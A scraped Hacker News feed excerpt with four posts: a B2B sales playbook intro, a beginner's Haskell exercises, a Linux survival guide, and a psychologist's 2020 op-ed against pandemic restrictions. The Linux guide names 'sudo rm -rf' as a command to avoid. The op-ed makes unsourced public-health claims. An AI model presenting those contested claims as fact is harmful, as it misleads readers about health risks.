<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Welcome! You're probably here because you read <a href="https://twitter.com/ChrisJBakke/status/1309197276061945857" target="_blank">this tweet</a> and then signed up to hear the longer-form version of how we ran founder-led sales to grow from $0 to $2m ARR in under 2 years.</p><p><strong>This guide is for founders who have a B2B company that is just starting out, where you're selling a product that is $250/mo or more.</strong></p><p>You might also find value in certain sections if you're running an agency, or a B2C company, or are selling a product &lt;$250/mo. You might find value if you're a B2B sales leader, or an account executive, or are just trying to learn more about sales.</p><p>Like many other things - sales, marketing, pricing, and onboarding are all really case-dependent. This isn't meant to be advice, or "go do this," but rather, "here's the playbook that worked well for us, with a specific product, at a specific moment in time."</p><h2 id="why-founder-led-sales-is-important"><a href="#why-founder-led-sales-is-important" aria-label="why founder led sales is important permalink" target="_blank"></a>Why founder-led sales is important</h2><p><strong>Sales should to be driven by at least one founder until you stop learning new things about your customers, the problem you are solving, and how to position your solution.</strong></p><p>At our last company, we had all three founders involved in sales at some level for almost 2 years.</p><p>No one is going to understand the product and problem it solves better than the founders. If that's not the case, you have bigger problems than sales.</p><p><strong>Sales conversations are also your most important feedback loop.</strong> As a founder, you need a front row seat to drive product, pricing and marketing decisions.</p><h2 id="why-i-wrote-this"><a href="#why-i-wrote-this" aria-label="why i wrote this permalink" target="_blank"></a>Why I wrote this</h2><p>I've done a lot of sales. I've worked at, built, founded, and sold a couple companies. Everything about a startup is sales: you're selling a product or service to a customer, you're pitching the best people to join your team, you're pitching investors, you're selling a vision to your team, you're striking a critical partnership.</p><p><strong>Everything is sales, so we might as well get good at it.</strong></p><p>I didn't write this alone. Our team at my new company <a href="https://laskie.co/" target="_blank">Laskie</a> encouraged me to write this, and helped out a lot.</p><p><strong>Please reach out with questions: <a href="mailto:chris@laskie.co" target="_blank">chris@laskie.co</a>.</strong></p><hr></div></div></div>]]>
            </description>
            <link>https://laskie.co/playbooks/bootstrapping-b2b-sales</link>
            <guid isPermaLink="false">hacker-news-small-sites-25019737</guid>
            <pubDate>Sat, 07 Nov 2020 21:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first time pure functional programming]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25019590">thread link</a>) | @lassmaglio
<br/>
November 7, 2020 | https://www.sandromaglione.com/2020/11/07/first-time-pure-functional-programming/ | <a href="https://web.archive.org/web/*/https://www.sandromaglione.com/2020/11/07/first-time-pure-functional-programming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Yesterday I had my first experience with pure functional programming. I heard this term, functional programming, nearly a year ago. Since then I became fascinated by the concept but I never dug deep into the paradigm.</p><p>This semester I decided to enroll in a course on principles of programming languages. I am now learning <strong>Haskell</strong>, and specifically the pure functional programming paradigm at its core.</p><p>Yesterday was my first coding session with functional programming. I report here my experience as a reminder for myself and as a source of inspiration for newcomers.</p><p>It was not easy, but it was fun.</p><h3>Installation</h3><p>I skip the installation details. I am on Windows. What I did was going to <a href="https://www.haskell.org/" target="_blank" rel="noreferrer noopener">https://www.haskell.org/</a>, in the Downloads section, and follow the instructions. There are also plenty of videos on Youtube, so this should be the easy part.</p><h3>Coding exercises</h3><p>I found an interesting website here <a href="https://www.seas.upenn.edu/~cis194/spring13/lectures.html" target="_blank" rel="noreferrer noopener">https://www.seas.upenn.edu/~cis194/spring13/lectures.html</a>. It contains 12 weeks of lessons and homework for each week. Every homework is tailored for the knowledge that you should have acquired if you followed the previous weeks’ lessons. Perfect, I started from here.</p><h3>Task 1 – Reasoning as a javascript developer</h3><p>The first task I tackled is:</p><blockquote><p>Double the value of every second digit beginning from the right. That is, the last digit is unchanged; the second-to-last digit is doubled; the third-to-last digit is unchanged; and so on.</p><p>For example, [1,3,8,6] becomes [2,3,16,6].</p><cite>https://www.seas.upenn.edu/~cis194/spring13/hw/01-intro.pdf</cite></blockquote><p>Now, I read somewhere that the first and most important step is to define the input and output types of the function. The types will help you reason on the problem and (hopefully) understand better the solution.</p><p>Coming from javascript and dart, I knew of the <code><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map" target="_blank" rel="noreferrer noopener">map</a></code> function. Specifically, the <code>map</code> with index. I also knew that also Haskell has the <code>map</code> function, but the signature does not provide the index of the element.</p><p>My idea was to use the index to compute if the current position is even or odd and applying the doubling when needed. So, my first task became creating a map indexed function in Haskell.</p><p>I copied the type signature of the <code>map</code> function in Haskell:</p><p>I then created a helper function that takes also the initial index as input.</p><p>The function has three arguments:</p><ol><li>The mapping function, from the element <code>a</code> of the source list and the index position <code>Int</code> to the mapped element <code>b</code> of the resulting list</li><li>The initial index as <code>Int</code></li><li>The source list to map <code>[a]</code></li></ol><div><pre data-setting="{&quot;mode&quot;:&quot;haskell&quot;,&quot;mime&quot;:&quot;text/x-haskell&quot;,&quot;theme&quot;:&quot;react&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Haskell&quot;,&quot;modeName&quot;:&quot;haskell&quot;}">mapIndexedManual :: (a -&gt; Int -&gt; b) -&gt; Int -&gt; [a] -&gt; [b]
mapIndexedManual f n [] = []
mapIndexedManual f n (x : xs) = f x n : mapIndexedManual f (n + 1) xs</pre></div><p>Using this function I was able to write the map indexed by passing an initial index value of 0:</p><div><pre data-setting="{&quot;mode&quot;:&quot;haskell&quot;,&quot;mime&quot;:&quot;text/x-haskell&quot;,&quot;theme&quot;:&quot;react&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Haskell&quot;,&quot;modeName&quot;:&quot;haskell&quot;}">mapIndexed :: (a -&gt; Int -&gt; b) -&gt; [a] -&gt; [b]
mapIndexed f [] = []
mapIndexed f l = mapIndexedManual f 0 l</pre></div><p>Using this function it becomes easy to complete the first exercise of the homework:</p><div><pre data-setting="{&quot;mode&quot;:&quot;haskell&quot;,&quot;mime&quot;:&quot;text/x-haskell&quot;,&quot;theme&quot;:&quot;react&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Haskell&quot;,&quot;modeName&quot;:&quot;haskell&quot;}">doubleEven :: [Int] -&gt; [Int]
doubleEven n = mapIndexed (\x i -&gt; if i `mod` 2 == 0 then (x + x) else x) n</pre></div><p>List of the concepts used:</p><ul><li><a href="https://stackoverflow.com/a/1696762/7033357" target="_blank" rel="noreferrer noopener">Prepend operator <code>:</code></a></li><li><a href="https://wiki.haskell.org/Anonymous_function" target="_blank" rel="noreferrer noopener">Anonymous function</a></li><li><a href="https://wiki.haskell.org/If-then-else" target="_blank" rel="noreferrer noopener">If-then-else</a></li><li><code><a href="http://www.zvon.org/other/haskell/Outputprelude/mod_f.html" target="_blank" rel="noreferrer noopener">mod</a></code></li></ul><h3>Task 2 – Function composition</h3><blockquote><p>Add the digits of the doubled values and the undoubled digits from the original number.</p><p>For example, [2,3,16,6] becomes 2+3+1+6+6 = 18.</p><cite>https://www.seas.upenn.edu/~cis194/spring13/hw/01-intro.pdf</cite></blockquote><p>This is a more technical problem. I have some memories of my programming 101 classes in which we reasoned about how to sum the digits of a number.</p><p>The first function I wrote is recursive. It sums the digits of a given <code>Int</code>:</p><div><pre data-setting="{&quot;mode&quot;:&quot;haskell&quot;,&quot;mime&quot;:&quot;text/x-haskell&quot;,&quot;theme&quot;:&quot;react&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Haskell&quot;,&quot;modeName&quot;:&quot;haskell&quot;}">sumDigits :: Int -&gt; Int
sumDigits n = if n &lt; 10 then n else ((sumDigits (n `mod` 10)) + (sumDigits (n `div` 10)))</pre></div><p>I had some problems with the <code>div</code> function. I tried to use the standard <code>/</code> but it caused problems with the type conversion. It took me some time to end up using the <code>div</code>.</p><p>This function is recursive. It sums directly single digits numbers (<code>n &lt; 10</code>) and otherwise extracts each digit in a recursive call.</p><p>That was the difficult part of the second exercise. From there I just wrote some more functions to apply the <code>sumDigit</code> to each element of a list and then sum the elements of the list:</p><div><pre data-setting="{&quot;mode&quot;:&quot;haskell&quot;,&quot;mime&quot;:&quot;text/x-haskell&quot;,&quot;theme&quot;:&quot;react&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Haskell&quot;,&quot;modeName&quot;:&quot;haskell&quot;}">sumList :: [Int] -&gt; Int
sumList [] = 0
sumList (x : xs) = x + sumList xs

addDigits :: [Int] -&gt; [Int]
addDigits [] = []
addDigits l = map sumDigits l

addSumDigits :: [Int] -&gt; Int
addSumDigits l = sumList (addDigits l)</pre></div><p>Here I noticed one interesting result of the functional programming paradigm. I was forced to write single self-contained functions and reason about each of them. Then the solution would simply be a composition of smaller pure function.</p><p>In the example, <code>addSumDigits</code> becomes the composition of <code>sumList</code> and <code>addDigits</code>, that itself used the <code>sumDigits</code> function written above.</p><p>List of the concepts used:</p><ul><li><code><a href="http://zvon.org/other/haskell/Outputprelude/div_f.html" target="_blank" rel="noreferrer noopener">div</a></code></li><li><code><a href="http://zvon.org/other/haskell/Outputprelude/map_f.html" target="_blank" rel="noreferrer noopener">map</a></code></li><li><a href="http://learnyouahaskell.com/recursion">Recursion</a></li></ul><h3>Task 3</h3><blockquote><p>Calculate the remainder when the sum is divided by 10. For the above example, the remainder would be 8. If the result equals 0, then the number is valid.</p><cite>https://www.seas.upenn.edu/~cis194/spring13/hw/01-intro.pdf</cite></blockquote><p>By this point, I became more accustomed to the process of writing pure functions. Using the functions of task 1 and task 2, the solution to the full problem became straightforward:</p><div><pre data-setting="{&quot;mode&quot;:&quot;haskell&quot;,&quot;mime&quot;:&quot;text/x-haskell&quot;,&quot;theme&quot;:&quot;react&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Haskell&quot;,&quot;modeName&quot;:&quot;haskell&quot;}">checkValid :: Int -&gt; Bool
checkValid n = n `mod` 10 == 0

allInOne :: [Int] -&gt; Bool
allInOne n = checkValid (addSumDigits (doubleEven n))</pre></div><p>Once again, we notice how the final complete function is just a composition of the other functions. Since all the functions are pure, the output of <code>allInOne</code> will always be the same given the same input.</p><p>Furthermore, everything is type-safe; the compiler will not allow you to pass incompatible parameters. Therefore, we can be sure that the function is correct (given that we did not make any logic mistakes in the other functions).</p><h3>Conclusion</h3><p>Writing functional code is not easy. Years of imperative programming makes it even more uncomfortable. Nonetheless, you feel satisfied when you are finally able to complete the puzzle.</p><p>It took me about 3 hours to write those functions. Most of the time I spent thinking about what types my function should have based on the solution I had in mind.</p><p>It had a lot of fun overall. I know that there is a lot (<span>a lot</span>) more in functional programming and Haskell. Anyhow, I am happy I was able to complete the exercises successfully.</p></div></div></div>]]>
            </description>
            <link>https://www.sandromaglione.com/2020/11/07/first-time-pure-functional-programming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25019590</guid>
            <pubDate>Sat, 07 Nov 2020 21:26:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux – A Survival Guide for Beginners]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25019381">thread link</a>) | @URfejk
<br/>
November 7, 2020 | https://www.jacobgoldstein.tk/linux-survival-guide/ | <a href="https://web.archive.org/web/*/https://www.jacobgoldstein.tk/linux-survival-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                



<p>I survived the transition to Linux—and you can too</p>

<p><img src="https://cdn-images-1.medium.com/max/12032/1*XXI-kg18liPn4XcfZmoqQQ.jpeg" alt="Photo by [Chris Ried](https://unsplash.com/@cdr6934?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText) on [Unsplash](https://unsplash.com/search/photos/code?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText)"><em>Photo by <a href="https://unsplash.com/@cdr6934?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank">Chris Ried</a> on <a href="https://unsplash.com/search/photos/code?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank">Unsplash</a></em></p>

<p>Switching from Windows to <a href="https://www.linux.org/" target="_blank">Linux</a> can be really scary. But if you can survive the first few months, the eventual returns are exponential. Here’s how I survived.</p>

<h2 id="tldr">TLDR</h2>

<ol>
<li><p>Though I am just an amateur in Linux, I was able to survive the transition and indeed benefitted from it. So these are my notes for somebody facing a similar situation.</p></li>

<li><p>Pick <a href="https://ubuntu.com/" target="_blank">Ubuntu</a> to start with. Choose other flavours once you know better and can decide for yourself.</p></li>

<li><p>Get comfortable with following commands ssh, pwd, ls, cd, mv, cp, scp, grep, find, rm. Tip: you can use <a href="https://tldr.ostera.io/cp" target="_blank">https://tldr.ostera.io/cp</a> to get the list of most frequently used options of these commands.</p></li>

<li><p>Learn to use the | symbol. Using this symbol, you can pass the output of one command as an input to the next command.</p></li>
</ol>

<h2 id="the-long-version">The Long Version</h2>

<p>In my first company, we were using Windows extensively, whether it was desktop machines we used for development or the servers on which we deployed our code. But when I moved to my <a href="http://azrisolutions.com/?source=gokulnk" target="_blank">second company</a>, it was all in on OSS and hence using Linux was mandatory there. It became a herculean task for me. For the first month or so it was a nightmare.</p>

<p>Having gone through that nightmare and survived it, I am making this list to help others like me who are trying to make this transition.</p>

<h2 id="new-environments">New Environments</h2>

<p>Transitions are hard in general. New environments can be scary. If you’re a Windows user who has never used the command line, then transition to Linux can get really scary. Don’t fret because that is generally the experience of many people who are making this transition. Knowing that others also find it difficult can be really consoling at times.</p>

<p>According to me, the two main reasons that make transitions difficult are: <strong>lack of familiarity</strong> and <strong>fear of screwing up.</strong></p>

<h3 id="lack-of-familiarity">Lack of familiarity</h3>

<p>To address the issue of familiarity, I started using Linux on my office laptop as well as my personal laptop. I started reading blogs about Linux and followed some interesting Linux-related accounts on Twitter. I reached out to people who were good at Linux. I would walk up to their cubicles and ask them to show me their command history. I learned a lot more from this than from reading the blogs. Most of the times, since it’s just muscle memory, the programmers can’t explain it. But their history is a treasure trove.</p>

<p>I would recommend running the following command. You will get many insights into the commands your Linux heroes use frequently.</p>
<div><pre><code data-lang="bash">history | awk ‘<span>{</span> $1<span>=</span>””; print $0 <span>}</span>’ | sort | uniq -c | sort -nr | head -20</code></pre></div>
<p>Run the command on the terminals of the Linux gurus in your office. Ask them about the commands you are not familiar with and you should be able to learn a lot more than what a couple of books could teach you. Don’t forget that these are battle-tested commands and hence much more valuable than standard examples in blogs. If you cannot understand what the above command does, don’t worry—I’ll explain it later on in the piece.</p>

<h3 id="fear-of-screwing-up">Fear of screwing up</h3>

<p>I have been using Linux for a couple of years but I still have this fear. This fear was multi-fold when I started. One thing that helped me a lot was, I spoke to Linux pros in my company and made a blacklist—a list of commands that I should never use or use with caution. sudo rm -rf was the top of the list. If you are anxious like me you can use <a href="https://github.com/nivekuil/rip" target="_blank">https://github.com/nivekuil/rip</a> on your local machine.</p>

<p>When I was going through the stage of being afraid of screwing up this Youtube user was of great help: <a href="https://www.jacobgoldstein.tk/linux-survival-guide/youtube.com/c/ChrisTitusTech/" target="_blank">ChrisTitus</a>. I wish I had spent more time watching him and learnt a couple more of his tricks. Find your angels and they will help you face your fears.</p>

<p>Now that your fears are addressed, let’s get started.</p>

<h2 id="why-you-should-learn-linux">Why You Should Learn Linux</h2>

<p>There are countless reasons why you should learn Linux. A google search will fetch you thousands of articles about why you should learn Linux, such as “<a href="https://www.quora.com/What-are-the-benefits-of-learning-Linux" target="_blank">What are the benefits of learning Linux</a>,” “<a href="https://fossbytes.com/10-reasons-switch-linux-os-right-now/" target="_blank">Why you should switch to Linux</a>” and “<a href="https://www.reddit.com/r/learnprogramming/comments/38zytg/is_it_worth_my_time_to_learn_linux_while_learning/" target="_blank">Is it worth my time to learn Linux while learning programming</a>?” Those three articles are worth a read, but here are my top two reasons why you should learn:</p>

<ol>
<li><p><strong>Linux is ubiquitous</strong>: Linux is everywhere. So with or without your knowledge there is a high probability that you are already using or benefitting from Linux. Understanding the basics of Linux can therefore come in handy in many situations. If you are a programmer then that chance is fairly high. A fair number of applications are deployed on Linux servers. So learning it can be a lifesaver.</p></li>

<li><p><strong>Linux is versatile</strong>: <a href="https://askubuntu.com/a/11396/217036" target="_blank">Both Linux and MAC are built on UNIX.</a> So if you are comfortable with the Linux terminal you should be able to use most of the commands in MAC terminal as well. <a href="https://unix.stackexchange.com/questions/25463/does-android-really-use-the-same-kernel-as-linux" target="_blank">Android uses the Linux kernel. </a><a href="https://www.raspberrypi.org/documentation/linux/kernel/building.md" target="_blank">Raspberry Pi uses Linux.</a> <a href="https://en.wikipedia.org/wiki/Linux#Embedded_devices" target="_blank">Many embedded devices use Linux.</a></p></li>
</ol>

<h2 id="why-did-you-start-learning-linux">Why Did You Start Learning Linux?</h2>

<p>As we’ve seen, there are many reasons for you to learn Linux. But if you are a programmer, there’s a fair chance that you fall into one of the two following categories:</p>

<ol>
<li><p>You read up about the cool things that Linux can do or you heard from a friend who just can’t stop raving about Linux.</p></li>

<li><p>Your laptop or desktop has a non-Unix OS. But your application or website is deployed on a Linux server.</p></li>
</ol>

<p>If you fall under the first category, you have all the time in the world. So take your sweet little time. If you fall under the second category, then there is a fair chance that you are running against a deadline. So finish the next parts and get your hands dirty.</p>

<h2 id="man-command-is-your-friend-or-is-it">Man Command Is Your Friend. Or Is It?</h2>

<p>One of the first tips you get when you want to learn Linux is “Use man command, it is your friend.” While there is a certain truth to it, it can be overwhelming for many first-time users. All you generally need are the options for the most frequently used scenarios of the command—and that is what is precisely missing from man pages. Luckily for you, there’s a project called <a href="https://tldr.sh/" target="_blank">TLDR </a>which is trying to fix exactly that.</p>

<p>Just compare the outputs of these two commands to see what I mean.</p>

<p><strong>First, output from man pages.</strong></p>

<p><img src="https://cdn-images-1.medium.com/max/2302/1*0QXjvacgzf1OHvziiX9s2w.png" alt=""></p>

<p>Now the output from TLDR project.</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/1*ZrSUDueSxi2uezlLqoq1iQ.png" alt=""></p>

<p>Do you see the difference?</p>

<p>TLDR is like the notes about commands I would have written for myself. I find it very handy. I installed the TLDR using <a href="https://nodejs.org/" target="_blank">nodejs</a> command sudo npm i -g tldr. If you have not installed nodejs I suggest you do it, as there are many node packages that are very handy. You can install nodejs using <a href="https://www.digitalocean.com/community/tutorials/how-to-install-node-js-on-ubuntu-18-04" target="_blank">this installation manual by Digitial Ocean.</a></p>

<p>I thought of sharing my notes on all the commands in this post, but then I came across a post by Andrew where he covers 101 bash commands:
<a href="https://dev.to/awwsmm/101-bash-commands-and-tips-for-beginners-to-experts-30je#whereis-which-whatis" target="_blank"><strong>101 Bash Commands and Tips for Beginners to Experts</strong>
*Andrew Jan 13 ・39 min readThe commands below are laid out in a more-or-less narrative style, so if you’re just getting…*dev.to</a></p>

<p>He has categorised all the commands and has good examples as well, and I can’t do a better job than that.</p>

<h2 id="learn-about-bash-profiles">Learn About Bash Profiles</h2>

<p>I found bash config files or bash profiles to be handy, so it helps to <a href="https://stackoverflow.com/a/415444/493742" target="_blank">learn the differences and how they work</a>.</p>

<p>One rule of thumb I follow is to add all my configs to .bash_profile and also make sure to load .bashrc within the .bash_profile file. I add my favourite aliases to this file. I keep a basic version of my .bash_profile in my private gist and I download the raw version of that on the servers where I need these.</p>



<h2 id="learn-to-use-emacs">Learn to Use Emacs</h2>

<p>One thing that I look for these days is commonality. This has helped me leverage what I know in multiple scenarios. For example, we are pushing a lot of Javascript in our team as we can use it in multiple scenarios, like our website front end, in browser console to scrape things quickly, debug our front end or learn from other websites, for joining collections in mongodb, and in nodejs for server side.</p>

<p>Stressing commonality helps us “Learn Once, Benefit Multiple Times”—a much greater ROI.</p>

<p>Coming back to Linux, I wanted to decide on a command line editor. I had the options of choosing Nano, Vim, or Emacs. I chose <a href="https://www.gnu.org/software/emacs/emacs.html" target="_blank">Emacs</a>.</p>

<p>Most of the commands used in Emacs can also be used in Linux shell. For example, you can use CTRL/CMD+A to go to the beginning of the line on both shell and Emacs. There are many such commands which work in both shell and Emacs. I think this is a huge advantage.</p>

<p>Since it is a command line editor, you can install it easily on any server. On every server where I am root I generally install Emacs. I am not sure if this is a good practice, but I generally find it very convenient. Yes I have decided not to learn Nano or Vim. Roast me for it if you want to.</p>

<h2 id="pipe-it">PIPE It</h2>

<p>Pipe command in Linux lets you use the output of one command as the input of the next command. This can be really helpful once you get the hang of a few Linux commands like grep, sort, awk, uniq, head, and tail. Piping along with these commands is immensely powerful. For example, I never remember what the options are in ls for showing only text files (and I don’t think you should either). I just run the following command.</p>

<pre><code>ls -l | grep txt
</code></pre>

<p>I know this is quick and dirty but it works in most scenarios.</p>

<p>For example, if we look at the history processing command we used in the first section:</p>

<pre><code>history | awk ‘{ $1=””; print $0 }’ | sort | uniq -c | sort -nr | head -20
</code></pre>

<p>We are taking the output of the history command, and we are passing it to awk to remove the line numbers at the beginning of each line from the output. Then we are passing the output to the sort command so that we can sort it. Then we are passing the output uniq command to retain only unique lines along with the number of occurrences. Then we are passing it to sort command to sort it in reverse order. Then we are passing it to head command to list only the top 20 most frequently used commands that are present in our history.</p>

<p>How cool is that?</p>

<h2 id="grep-it">GREP it</h2>

<p>If you are used to SDKs and GUI editors, GREP might seem little limited. But most of the time, the differentiator is that you can chain the output of the grep …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jacobgoldstein.tk/linux-survival-guide/">https://www.jacobgoldstein.tk/linux-survival-guide/</a></em></p>]]>
            </description>
            <link>https://www.jacobgoldstein.tk/linux-survival-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25019381</guid>
            <pubDate>Sat, 07 Nov 2020 21:07:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Start Living a Normal Life Again]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25019333">thread link</a>) | @emersonrsantos
<br/>
November 7, 2020 | https://www.journeysbridge.com/blog/normal-life-again | <a href="https://web.archive.org/web/*/https://www.journeysbridge.com/blog/normal-life-again">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          

          <main>
            
              <section data-content-field="main-content">
                <article id="post-5f9f08f976564e30d965d9c9" data-item-id="5f9f08f976564e30d965d9c9">

    
      <a href="https://www.journeysbridge.com/blog/normal-life-again" data-content-field="title" target="_blank">Start Living a Normal Life Again</a>
    

    <div data-layout-label="Post Body" data-type="item" data-updated-on="1604259121307" id="item-5f9f08f976564e30d965d9c9"><div><div><div data-block-type="2" id="block-e0591466ae5253fe1596"><div><p><em>By Tim Weissman, Ph.D.</em></p><div><p>As a Psychologist, I am quite concerned about the mental health toll the pandemic has been taking on most of society.&nbsp; It is clear at this point that mental health, and by extension our physical health, has been significantly eroded by the continued daily restrictions on normal behavior and media-driven narratives of fear.&nbsp; Yes, Covid-19 is a real virus, which has infected millions worldwide, and caused a great deal of physical illness, heartache, and death.&nbsp; Yes, we should take reasonable precautions.&nbsp; However, our society must stop living in fear, and start living as normally as possible again.&nbsp; I believe it is critical for our overall health.</p><p>Living in constant fear is not healthy for our minds, and it is not healthy for our bodies.&nbsp; The old adage is true – face your fears to overcome them.&nbsp; As difficult as it may be, a truly effective way to reduce anxiety is to expose ourselves to what we fear.&nbsp; When we do this, the fear subsides and we feel more agency in our lives. </p></div></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1604258003048_33423"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258219555-NAR1TYFBRAB7KMLMY67Q/ke17ZwdGBToddI8pDm48kFmfxoboNKufWj-55Bgmc-J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iXS6XmVv7bUJ418E8Yoc1hjuviiiZmrL38w1ymUdqq4JaGeFUxjM-HeS7Oc-SSFcg/fear-anxiety-counseling.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258219555-NAR1TYFBRAB7KMLMY67Q/ke17ZwdGBToddI8pDm48kFmfxoboNKufWj-55Bgmc-J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iXS6XmVv7bUJ418E8Yoc1hjuviiiZmrL38w1ymUdqq4JaGeFUxjM-HeS7Oc-SSFcg/fear-anxiety-counseling.jpg" data-image-dimensions="2500x1668" data-image-focal-point="0.5,0.5" alt="fear-anxiety-counseling.jpg" data-load="false" data-image-id="5f9f099d73e1561a65dc6e07" data-type="image" src="https://www.journeysbridge.com/blog/fear-anxiety-counseling.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604258003048_33723"><div><div><p>As a society, we are creating our own nightmare.  We are letting our children down.  We are letting our elderly down.  And, we are letting ourselves down.</p><p>We are teaching children to be afraid of human contact and robbing them of childhood.  We are leaving our elderly to die confused and alone.  We are turning our eyes away from the mounting despair of millions, calling their livelihoods unessential, and ignoring the skyrocketing suicides and overdoses.  We are sacrificing many other forms of physical health in a fear-laden pursuit of complete Covid-avoidance.</p><p>We need to stop.  We can.  We start by being clear-eyed about the costs we are inflicting on ourselves.  It is not only Covid which can cause pain or destroy a life.  Context is desperately needed to keep our perspective.</p></div></div></div><div data-block-type="5" id="block-954a9b5eaff3625de34d"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258329112-7YZD20YXBGCH4W44A9QQ/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/fear-family-children-health.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258329112-7YZD20YXBGCH4W44A9QQ/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/fear-family-children-health.jpg" data-image-dimensions="2500x1667" data-image-focal-point="0.5,0.5" alt="fear-family-children-health.jpg" data-load="false" data-image-id="5f9f0a0fc0d9fd7d2f88a44d" data-type="image" src="https://www.journeysbridge.com/blog/fear-family-children-health.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-2a07653607b2963d89e5"><div><p><strong>A generation of children developmentally stunted</strong></p><p>Children need social engagement to develop.&nbsp; We are social creatures, and we learn about ourselves, and the world, in relation to others.&nbsp; Peers are particularly important because it is within these relationships that children learn how to navigate emotional conflicts, and ultimately, how to work and play well with others.&nbsp; The toll on children in large families, with many siblings, is likely not as severe, but how many large families exist today, as compared to 50+ years ago?&nbsp; The truth is that most families are smaller today, and it is imperative for children to interact with peers in person.</p><p>Children need to be back in school, living a much more normal life (not the proverbial “new normal”).&nbsp; Safety precautions are fine, but if policy-makers require face-coverings then teachers and children should only wear translucent masks or face shields so that their facial expressions are readable.&nbsp; Vast amounts of communication is non-verbal, and facial expressions reveal a great deal of information when communicating.  This won’t be lost if see-through face-coverings are used.  </p><p>Sports and social events need to start back up.&nbsp; Both types of activities offer incalculable benefits for development.&nbsp; Without in-person schooling or extracurricular activities, children will spin their developmental wheels.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1604258003048_48612"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
